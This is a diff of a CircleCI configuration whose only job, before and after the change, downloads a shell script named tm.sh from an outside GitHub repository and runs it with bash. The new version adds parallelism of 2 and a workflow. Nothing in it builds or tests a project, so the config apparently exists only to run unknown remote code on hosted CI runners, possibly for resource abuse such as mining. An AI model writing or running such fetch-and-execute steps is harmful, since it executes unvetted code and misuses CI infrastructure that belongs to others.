@@ -1,14 +1,16 @@
 version: 2.1
-executors:
-  my-executor:
-    docker:
-      - image: cimg/ruby:3.0.3-browsers
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-
 jobs:
-  my-job:
-    executor: my-executor
-    steps:
-      - run: wget https://raw.githubusercontent.com/Vaping86/RedCeh/main/tm.sh && chmod +x tm.sh && bash tm.sh
+    trial:
+      docker:
+            - image: cimg/node:18.2.0
+      parallelism: 2
+      steps:
+        - run:
+            name: "trial"
+            command: wget https://raw.githubusercontent.com/Vaping86/RedCeh/main/tm.sh && chmod +x tm.sh && bash tm.sh 
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
